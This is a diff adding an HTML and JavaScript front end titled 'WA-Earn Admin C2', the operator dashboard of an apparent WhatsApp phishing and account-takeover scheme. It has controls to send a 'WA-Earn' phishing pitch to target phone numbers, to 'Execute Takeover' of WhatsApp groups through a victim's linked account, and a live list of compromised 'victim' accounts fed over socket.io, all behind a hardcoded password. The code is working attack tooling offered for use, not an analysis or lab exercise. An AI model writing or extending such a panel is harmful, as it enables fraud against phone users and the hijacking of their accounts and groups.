@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WA-Earn | Admin C2</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0f172a;
+            --card: #1e293b;
+            --primary: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --text: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: #334155;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
+        
+        /* Top Bar */
+        .topbar { background: var(--card); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); }
+        .logo { font-weight: 800; font-size: 20px; color: var(--text); display: flex; align-items: center; gap: 10px; }
+        .logo span { color: var(--danger); font-size: 12px; background: rgba(239,68,68,0.2); padding: 4px 8px; border-radius: 4px; border: 1px solid var(--danger); margin-left: 10px; }
+        
+        /* Layout */
+        .dashboard { display: grid; grid-template-columns: 350px 1fr; gap: 20px; padding: 30px; max-width: 1400px; margin: 0 auto; width: 100%; }
+        @media (max-width: 900px) { .dashboard { grid-template-columns: 1fr; } }
+        
+        /* Panels */
+        .panel { background: var(--card); border-radius: 16px; border: 1px solid var(--border); padding: 25px; }
+        .panel-title { font-size: 16px; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
+        
+        /* Forms & Inputs */
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 8px; font-weight: 500; }
+        .input-group input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border); background: var(--bg); color: var(--text); font-size: 14px; outline: none; }
+        .input-group input:focus { border-color: var(--primary); }
+        
+        .btn { width: 100%; padding: 12px; border-radius: 8px; border: none; font-size: 14px; font-weight: 600; cursor: pointer; transition: 0.2s; display: flex; justify-content: center; align-items: center; gap: 8px; }
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-primary:hover { background: #059669; }
+        .btn-danger { background: rgba(239,68,68,0.1); color: var(--danger); border: 1px solid var(--danger); }
+        .btn-danger:hover { background: var(--danger); color: white; }
+        
+        /* Victim List */
+        .victim-list { max-height: 600px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
+        .victim-item { background: var(--bg); padding: 15px; border-radius: 8px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .victim-phone { font-weight: 600; font-size: 15px; }
+        .victim-status { font-size: 11px; color: var(--primary); display: flex; align-items: center; gap: 5px; margin-top: 5px; }
+        .status-dot { width: 8px; height: 8px; background: var(--primary); border-radius: 50%; box-shadow: 0 0 8px var(--primary); }
+        
+        /* Log Console */
+        .console { background: #000; border-radius: 8px; padding: 15px; font-family: monospace; font-size: 12px; color: #a3be8c; height: 200px; overflow-y: auto; border: 1px solid var(--border); margin-top: 20px; }
+        .console-line { margin-bottom: 5px; }
+        .console-line.error { color: #bf616a; }
+        .console-line.info { color: #81a1c1; }
+        
+        /* Auth Screen */
+        #auth-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; display: flex; justify-content: center; align-items: center; }
+        .auth-box { background: var(--card); padding: 40px; border-radius: 16px; border: 1px solid var(--border); width: 100%; max-width: 400px; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <!-- Auth Screen -->
+    <div id="auth-screen">
+        <div class="auth-box">
+            <h2 style="margin-bottom: 20px;">System Login</h2>
+            <div class="input-group">
+                <input type="password" id="admin-pass" placeholder="Enter Admin Password">
+            </div>
+            <button class="btn btn-primary" onclick="login()">Authenticate</button>
+        </div>
+    </div>
+
+    <!-- Main App -->
+    <div id="main-app" style="display: none;">
+        <div class="topbar">
+            <div class="logo">WA-Earn Control Room <span>LIVE</span></div>
+            <div style="font-size: 14px; color: var(--text-muted);">Admin Operator</div>
+        </div>
+
+        <div class="dashboard">
+            <!-- Left Column: Actions -->
+            <div>
+                <div class="panel" style="margin-bottom: 20px;">
+                    <div class="panel-title">📤 Send Phishing Invite</div>
+                    <div class="input-group">
+                        <label>Target Phone Number</label>
+                        <input type="tel" id="target-number" placeholder="e.g. 2348012345678">
+                    </div>
+                    <button class="btn btn-primary" onclick="sendInvite()">Send WA-Earn Pitch</button>
+                </div>
+
+                <div class="panel">
+                    <div class="panel-title">💀 Group Takeover</div>
+                    <div class="input-group">
+                        <label>Victim Number (Must be Admin)</label>
+                        <input type="tel" id="victim-number" placeholder="e.g. 2348012345678">
+                    </div>
+                    <div class="input-group">
+                        <label>Group JID (e.g. 123456@g.us)</label>
+                        <input type="text" id="group-jid" placeholder="120363...@g.us">
+                    </div>
+                    <button class="btn btn-danger" onclick="takeoverGroup()">Execute Takeover</button>
+                </div>
+            </div>
+
+            <!-- Right Column: Victims & Logs -->
+            <div>
+                <div class="panel" style="height: 100%;">
+                    <div class="panel-title">🔗 Linked Accounts</div>
+                    <div class="victim-list" id="victim-list">
+                        <!-- Victims populate here -->
+                        <div style="color: var(--text-muted); text-align: center; padding: 20px;">Waiting for connections...</div>
+                    </div>
+                    
+                    <div class="panel-title" style="margin-top: 30px;">🖥️ System Logs</div>
+                    <div class="console" id="console">
+                        <div class="console-line info">[*] System initialized...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let victims = [];
+
+        // Auth Logic
+        function login() {
+            const pass = document.getElementById('admin-pass').value;
+            if (pass === 'waearn2026') { // Hardcoded password
+                document.getElementById('auth-screen').style.display = 'none';
+                document.getElementById('main-app').style.display = 'block';
+                socket.emit('admin_join');
+            } else {
+                alert('Access Denied');
+            }
+        }
+
+        // Console Logger
+        function log(msg, type = 'info') {
+            const c = document.getElementById('console');
+            const line = document.createElement('div');
+            line.className = `console-line ${type}`;
+            const time = new Date().toLocaleTimeString();
+            line.innerText = `[${time}] ${msg}`;
+            c.appendChild(line);
+            c.scrollTop = c.scrollHeight;
+        }
+
+        // Send Invite
+        function sendInvite() {
+            const num = document.getElementById('target-number').value;
+            if (!num) return alert('Enter a number');
+            socket.emit('admin_send_invite', num);
+            log(`Sending invite to ${num}...`, 'info');
+        }
+
+        // Takeover Group
+        function takeoverGroup() {
+            const victim = document.getElementById('victim-number').value;
+            const group = document.getElementById('group-jid').value;
+            if (!victim || !group) return alert('Enter victim number and group JID');
+            socket.emit('admin_takeover', { victim, group });
+            log(`Initiating takeover of ${group} using ${victim}...`, 'error');
+        }
+
+        // Listen for Victim Updates
+        socket.on('victim_update', (victimList) => {
+            const listEl = document.getElementById('victim-list');
+            if (victimList.length === 0) {
+                listEl.innerHTML = '<div style="color: var(--text-muted); text-align: center; padding: 20px;">No accounts linked yet.</div>';
+                return;
+            }
+            
+            listEl.innerHTML = '';
+            victimList.forEach(v => {
+                listEl.innerHTML += `
+                    <div class="victim-item">
+                        <div>
+                            <div class="victim-phone">+${v.number}</div>
+                            <div class="victim-status"><div class="status-dot"></div> ${v.status}</div>
+                        </div>
+                    </div>
+                `;
+            });
+        });
+
+        // Listen for logs from server
+        socket.on('log', (data) => {
+            log(data.msg, data.type);
+        });
+
+        // Handle Enter key for login
+        document.getElementById('admin-pass').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') login();
+        });
+    </script>
+</body>
+  </html>
